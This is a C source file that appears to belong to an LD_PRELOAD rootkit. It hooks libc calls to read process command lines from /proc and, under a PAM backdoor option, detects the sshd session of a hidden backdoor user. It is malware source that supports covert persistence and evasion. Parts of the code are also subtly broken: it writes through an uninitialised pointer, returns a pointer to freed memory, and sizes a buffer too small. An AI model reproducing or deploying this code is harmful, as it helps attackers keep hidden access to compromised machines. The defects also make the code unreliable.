#include "../hooks/libdl/libdl.h"

/* this is done whenever, for whatever reason, we can't
 * open the process cmdline file for reading. */
void fallbackme(char **dest){
    strncpy(*dest, FALLBACK_PROCNAME, strlen(FALLBACK_PROCNAME)+1);
}

/* gets the path of pid's cmdline file & opens it
 * for reading. returns the resulting fd. */
int open_cmdline(pid_t pid){
    char path[PROCPATH_MAXLEN];
    int fd;

    snprintf(path, sizeof(path), CMDLINE_PATH, pid);
    hook(COPEN);
    fd = (long)call(COPEN, path, 0, 0);
    memset(path, 0, strlen(path));   /* clear path after */
                                     /* getting its fd.  */

    return fd;
}

// mode = MODE_NAME || MODE_CMDLINE
char *process_info(pid_t pid, int mode){
    char *process_info;
    int fd, c;

    hook(CREAD);

    fd = open_cmdline(pid);
    if(fd < 0){
        fallbackme(&process_info);
        goto end_processinfo;
    }

    switch(mode){
        case MODE_NAME:
            process_info = (char *)malloc(NAME_MAXLEN);   /* read cmdline text into process_info.   */
                                                          /* cmdline null terminates after process' */
                                                          /* name.                                  */
            c = (long)call(CREAD, fd, process_info, NAME_MAXLEN);
            break;
        case MODE_CMDLINE:
            process_info = (char *)malloc(CMDLINE_MAXLEN);
            c = (long)call(CREAD, fd, process_info, CMDLINE_MAXLEN);

            for(int i = 0; i < c; i++)         /* replace null terminators with spaces  */
                if(process_info[i] == 0x00)    /* so that we can actually use the whole */
                    process_info[i] = 0x20;    /* 'cmdline' string.                     */
            break;
        default:
            fallbackme(&process_info);
            break;
    }

    close(fd);
end_processinfo:
    return process_info;
}

/* the following functions are just wrappers for determining the
 * name of the current process' name. */
int cmp_process(char *name){
    char *myname = process_name();
    int status = strncmp(myname, name, strlen(myname));
    free(myname);
    return !status;
}
char *str_process(char *name){
    char *myname = process_name(),
         *status = strstr(myname, name);
    free(myname);
    return status;
}
int process(char *name){
    if(cmp_process(name)) return 1;
    if(str_process(name)) return 1;
    return 0;
}

#ifdef USE_PAM_BD
/* determine if the calling process is a
 * backdoor user's sshd process. */
int bd_sshproc(void){
    int status = 0,
        sshds_len = strlen(SSHD_PROC_STR) + 
                    strlen(BD_UNAME);
    char sshds[sshds_len];

    snprintf(sshds, sshds_len, SSHD_PROC_STR, BD_UNAME);
    if(process(sshds)) status = 1;
    return status;
}
#endif